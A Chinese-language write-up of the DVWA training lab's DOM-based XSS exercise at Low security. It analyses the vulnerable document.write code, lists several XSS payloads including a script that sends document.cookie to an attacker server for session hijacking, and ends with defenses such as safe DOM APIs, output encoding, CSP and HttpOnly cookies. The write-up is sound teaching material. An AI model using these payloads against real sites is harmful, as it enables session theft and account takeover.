# DVWA XSS (DOM) Low 通关 WriteUp

## 一、DOM 型 XSS 概述

DOM 型 XSS（Document Object Model Based XSS）与反射型、存储型 XSS 的最大区别在于：**恶意脚本的注入和触发完全发生在客户端 JavaScript 中，不经过服务器端处理**。

数据流通常如下：

```text
攻击者构造恶意 URL
        ↓
受害者点击链接，浏览器加载页面
        ↓
页面中的 JavaScript 从 URL（如 location.href）中读取参数
        ↓
JavaScript 将参数未经安全处理地写入 DOM（如 document.write、innerHTML）
        ↓
浏览器将写入的内容解析为 HTML/JavaScript 并执行
```

服务器端可能完全没有收到或处理恶意 Payload，因此传统的服务器端过滤往往无效。防御 DOM 型 XSS 必须在客户端 JavaScript 中对输出进行编码或使用安全的 API。

DVWA 的 **XSS (DOM)** 模块模拟了一个语言选择下拉框，通过 URL 的 `default` 参数动态设置默认语言。

将 DVWA 安全级别设置为 **Low**，进入 **XSS (DOM)** 模块。

## 二、源码分析

查看 Low 级别源码，关键部分如下：

```php
<?php
if (!array_key_exists("default", $_GET) || !$_GET['default']) {
    $default = "English";
} else {
    $default = $_GET['default'];
}
?>
```

以及前端 JavaScript：

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}
document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
// ...
```

关键点：

1. JavaScript 直接从 `document.location.href` 中截取 `default=` 后面的内容。
2. 使用 `document.write()` 将内容写入 HTML，没有做任何编码或转义。
3. PHP 端虽然接收了 `$default`，但前端 JavaScript 并没有使用它，而是直接从 URL 读取。因此服务器端没有任何过滤机会。

## 三、手工测试流程

### 1\. 正常访问

```text
http://靶机IP/dvwa/vulnerabilities/xss_d/?default=English
```

页面下拉框中显示 English。

### 2\. 提交 Payload

```text
http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
```

浏览器弹出对话框，说明 DOM 型 XSS 存在。

查看页面源代码，可以看到 `document.write` 生成的 `<option>` 标签中包含了完整的 `<script>` 标签：

```html
<option value='<script>alert('DOM XSS')</script>'><script>alert('DOM XSS')</script></option>
```

浏览器在解析时执行了脚本。

## 四、常用 Payload 与利用方式

### 1\. 基础弹窗

```html
<script>alert(1)</script>
```

### 2\. 图片事件触发

```html
<img src=x onerror=alert(document.cookie)>
```

### 3\. 窃取 Cookie

```html
<script>new Image().src='http://攻击者IP/steal?c='+document.cookie;</script>
```

### 4\. 页面跳转

```html
<script>window.location='http://攻击者IP/'</script>
```

### 5\. URL 编码

由于 Payload 在 URL 中，特殊字符需要 URL 编码。例如 `<` 编码为 `%3C`，`>` 为 `%3E`，`/` 为 `%2F`。现代浏览器地址栏会自动编码，但用 Burp 或手工编码更可靠。

### 6\. 完整攻击链

构造恶意链接：

```text
http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>new Image().src='http://192.168.1.10/steal?c='+document.cookie;</script>
```

诱导受害者点击后，Cookie 会被发送到攻击者服务器。攻击者拿到 `PHPSESSID` 即可伪造会话。

## 五、Burp Suite 验证

由于 URL 中直接传递脚本可能被浏览器编码，可以用 Burp Suite 的 Repeater 进行验证：

1. 拦截请求：
   ```http
    GET /dvwa/vulnerabilities/xss_d/?default=English&Submit=Submit HTTP/1.1
    Host: 靶机IP
    Cookie: PHPSESSID=...; security=low
   ```
2. 将 `default` 参数改为：
   ```text
    default=<script>alert(1)</script>
   ```
3. 发送请求，查看响应体中是否原样包含 `<script>alert(1)</script>`。

## 六、漏洞成因与防御

**成因**：前端 JavaScript 使用 `document.write()` 将 URL 中的参数直接写入 HTML，未做任何编码或转义，导致浏览器将用户输入解析为 HTML/JavaScript 代码并执行。

**防御措施**：

1. **避免使用危险的接收器**  
   不要使用 `document.write()`、`innerHTML`、`eval()` 等直接解析 HTML 的 API。改用 `textContent`、`innerText` 或 `createElement` + `setAttribute`。
   ```javascript
    // 不安全
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
   
    // 安全
    var option = document.createElement("option");
    option.value = lang;
    option.textContent = decodeURI(lang);
    document.getElementById("langSelect").appendChild(option);
   ```
2. **对输出进行编码**  
   如果必须拼接 HTML，使用编码函数处理特殊字符：
   ```javascript
    function htmlEncode(str) {
        return str.replace(/&/g, "&amp;")
                  .replace(/</g, "&lt;")
                  .replace(/>/g, "&gt;")
                  .replace(/"/g, "&quot;")
                  .replace(/'/g, "&#x27;");
    }
   ```
3. **使用内容安全策略（CSP）**  
   通过 HTTP 响应头限制脚本来源，禁止内联脚本执行：
   ```text
    Content-Security-Policy: default-src 'self'; script-src 'self'
   ```
4. **Cookie 设置 HttpOnly**  
   防止 JavaScript 读取会话 Cookie：
   ```php
    session_set_cookie_params(['httponly' => true]);
   ```
5. **服务端与客户端双重校验**  
   服务端过滤可以作为纵深防御，但不能替代客户端的正确编码。对于 DOM 型 XSS，客户端才是主战场。

## 七、总结

Low 级别完全无过滤，直接通过 URL 的 `default` 参数注入 `<script>alert(1)</script>` 即可触发弹窗。利用方式包括窃取 Cookie、页面跳转、键盘记录等。防御核心是在客户端对输出进行编码，或使用安全的 DOM API。